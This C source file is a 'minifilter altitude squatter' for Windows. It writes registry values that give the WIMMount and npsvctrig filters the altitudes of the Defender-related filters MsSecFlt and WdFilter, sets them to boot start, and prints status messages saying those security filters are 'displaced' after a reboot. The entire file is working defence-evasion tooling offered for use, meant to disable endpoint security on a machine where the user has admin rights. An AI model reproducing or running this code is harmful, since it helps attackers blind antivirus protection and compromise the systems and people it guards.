#include <windows.h>
#include <stdio.h>

static BOOL SetRegSz(LPCSTR subKey, LPCSTR name, LPCSTR value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE *)value, (DWORD)strlen(value) + 1);
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

static BOOL SetRegDword(LPCSTR subKey, LPCSTR name, DWORD value)
{
    HKEY hKey;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Open %s failed (error %ld)\n", subKey, rc);
        return FALSE;
    }
    rc = RegSetValueExA(hKey, name, 0, REG_DWORD, (const BYTE *)&value, sizeof(value));
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS) {
        printf("    [-] Set %s failed (error %ld)\n", name, rc);
        return FALSE;
    }
    return TRUE;
}

typedef struct {
    const char *decoy;
    const char *instanceSubkey;
    const char *targetAltitude;
    const char *displaced;
} SquatEntry;

int main(void)
{
    printf("[*] Minifilter altitude squatter\n\n");

    SquatEntry entries[] = {
        {
            "WIMMount",
            "SYSTEM\\CurrentControlSet\\Services\\WIMMount\\Instances\\WIMMount",
            "385600",
            "MsSecFlt"
        },
        {
            "npsvctrig",
            "SYSTEM\\CurrentControlSet\\Services\\npsvctrig\\Instances\\npsvctrig",
            "328010",
            "WdFilter"
        },
    };
    int count = sizeof(entries) / sizeof(entries[0]);
    int ok = 0;

    for (int i = 0; i < count; i++) {
        SquatEntry *e = &entries[i];
        char svcKey[512];
        _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", e->decoy);

        printf("[*] %s -> altitude %s (displaces %s)\n", e->decoy, e->targetAltitude, e->displaced);

        BOOL s1 = SetRegSz(e->instanceSubkey, "Altitude", e->targetAltitude);
        BOOL s2 = SetRegDword(svcKey, "Start", 0);
        BOOL s3 = SetRegSz(svcKey, "Group", "FSFilter Bottom");

        if (s1 && s2 && s3) {
            printf("    [+] %s altitude squatted — %s displaced\n\n", e->displaced, e->displaced);
            ok++;
        } else {
            printf("    [-] Partial failure for %s\n\n", e->decoy);
        }
    }

    if (ok == count)
        printf("[+] All targets squatted. Reboot to apply.\n");
    else if (ok > 0)
        printf("[!] %d/%d succeeded. Reboot to apply.\n", ok, count);
    else
        printf("[-] All failed. Are you running as admin?\n");

    return ok == count ? 0 : 1;
}
